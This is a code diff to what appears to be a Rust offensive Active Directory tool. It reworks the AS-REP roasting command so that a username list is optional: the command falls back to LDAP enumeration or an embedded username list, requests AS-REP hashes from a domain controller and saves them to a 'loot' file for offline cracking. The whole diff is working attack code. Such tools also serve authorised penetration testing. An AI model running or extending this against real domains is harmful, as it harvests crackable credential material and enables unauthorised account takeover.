@@ -626,7 +626,7 @@ enum KerberosAction {
         spn: Option<String>,
     },
     AsrepRoast {
-        /// File with usernames to roast (one per line)
+        /// Optional file with usernames to roast (one per line)
         #[arg(short = 'U', long)]
         userlist: Option<String>,
     },
@@ -2726,57 +2726,117 @@ async fn cmd_kerberos(cli: &Cli, action: KerberosAction) -> i32 {
         }
         KerberosAction::AsrepRoast { userlist } => {
             use overthrone_core::proto::kerberos;
-            let users: Vec<String> = if let Some(path) = userlist {
-                match std::fs::read_to_string(&path) {
-                    Ok(content) => content
-                        .lines()
-                        .map(|l| l.trim().to_string())
-                        .filter(|l| !l.is_empty())
-                        .collect(),
-                    Err(e) => {
-                        banner::print_fail(&format!("Cannot read userlist {}: {}", path, e));
-                        return 1;
-                    }
-                }
-            } else {
-                banner::print_fail(
-                    "--userlist required for AS-REP roast (or use 'ovt enum --target asrep' first)",
-                );
-                return 1;
-            };
-
-            let mut hash_count = 0;
             let loot_dir = std::path::PathBuf::from("./loot");
             let _ = std::fs::create_dir_all(&loot_dir);
-            for user in &users {
-                match kerberos::asrep_roast(&dc, &creds.domain, user).await {
-                    Ok(hash) => {
-                        println!("{} AS-REP hash: {}", "✓".green(), user.cyan());
-                        let hash_file = loot_dir.join("asrep_hashes.txt");
-                        if let Ok(mut f) = std::fs::OpenOptions::new()
-                            .create(true)
-                            .append(true)
-                            .open(&hash_file)
-                        {
-                            use std::io::Write;
-                            let _ = writeln!(f, "{}", hash.hash_string);
-                        }
-                        hash_count += 1;
+            let output_path = loot_dir.join("asrep_hashes.txt");
+
+            let roast_users = |users: Vec<String>| {
+                let dc = dc.clone();
+                let domain = creds.domain.clone();
+                let output_path = output_path.clone();
+                async move {
+                    if users.is_empty() {
+                        banner::print_fail("No usernames provided for AS-REP roasting");
+                        return 1;
                     }
-                    Err(e) => {
-                        println!("{} {}: {}", "✗".dimmed(), user, e);
+
+                    let mut hash_count = 0;
+                    for user in &users {
+                        match kerberos::asrep_roast(&dc, &domain, user).await {
+                            Ok(hash) => {
+                                println!("{} AS-REP hash: {}", "✓".green(), user.cyan());
+                                if let Ok(mut f) = std::fs::OpenOptions::new()
+                                    .create(true)
+                                    .append(true)
+                                    .open(&output_path)
+                                {
+                                    use std::io::Write;
+                                    let _ = writeln!(f, "{}", hash.hash_string);
+                                }
+                                hash_count += 1;
+                            }
+                            Err(e) => {
+                                println!("{} {}: {}", "✗".dimmed(), user, e);
+                            }
+                        }
+                    }
+
+                    if hash_count > 0 {
+                        banner::print_success(&format!(
+                            "{} AS-REP hashes written to {}",
+                            hash_count,
+                            output_path.display()
+                        ));
+                        0
+                    } else {
+                        banner::print_fail("No AS-REP roastable accounts found");
+                        1
                     }
                 }
+            };
+
+            if let Some(path) = userlist {
+                let users: Vec<String> = match std::fs::read_to_string(&path) {
+                    Ok(content) => content
+                        .lines()
+                        .map(|line| line.trim().to_string())
+                        .filter(|line| !line.is_empty())
+                        .collect(),
+                    Err(e) => {
+                        banner::print_warn(&format!(
+                            "Cannot read userlist {}: {}. Falling back to embedded list.",
+                            path, e
+                        ));
+                        overthrone_hunter::userenum::embedded_usernames()
+                    }
+                };
+
+                return roast_users(users).await;
             }
-            if hash_count > 0 {
-                banner::print_success(&format!(
-                    "{} AS-REP hashes written to ./loot/asrep_hashes.txt",
-                    hash_count
-                ));
-            } else {
-                banner::print_fail("No AS-REP roastable accounts found");
-                return 1;
+
+            // No userlist provided — try LDAP enumeration first, then fall back.
+            let hunt_config = overthrone_hunter::HuntConfig {
+                dc_ip: dc.clone(),
+                domain: creds.domain.clone(),
+                username: creds.username.clone(),
+                secret: secret.clone(),
+                use_hash,
+                base_dn: None,
+                use_ldaps: false,
+                output_dir: loot_dir.clone(),
+                concurrency: 10,
+                timeout: 30,
+                jitter_ms: 0,
+                tgt: None,
+            };
+            let ac = overthrone_hunter::asreproast::AsRepRoastConfig {
+                output_file: Some(output_path.clone()),
+                ..Default::default()
+            };
+
+            match overthrone_hunter::asreproast::run(&hunt_config, &ac).await {
+                Ok(result) => {
+                    if result.hashes.is_empty() {
+                        banner::print_fail("No AS-REP roastable accounts found");
+                        return 1;
+                    }
+                    banner::print_success(&format!(
+                        "{} AS-REP hashes written to {}",
+                        result.hashes.len(),
+                        output_path.display()
+                    ));
+                    return 0;
+                }
+                Err(e) => {
+                    banner::print_warn(&format!(
+                        "LDAP enumeration failed: {}. Falling back to embedded list.",
+                        e
+                    ));
+                }
             }
+
+            let users = overthrone_hunter::userenum::embedded_usernames();
+            return roast_users(users).await;
         }
         KerberosAction::GetTgt => {
             use overthrone_core::proto::kerberos;
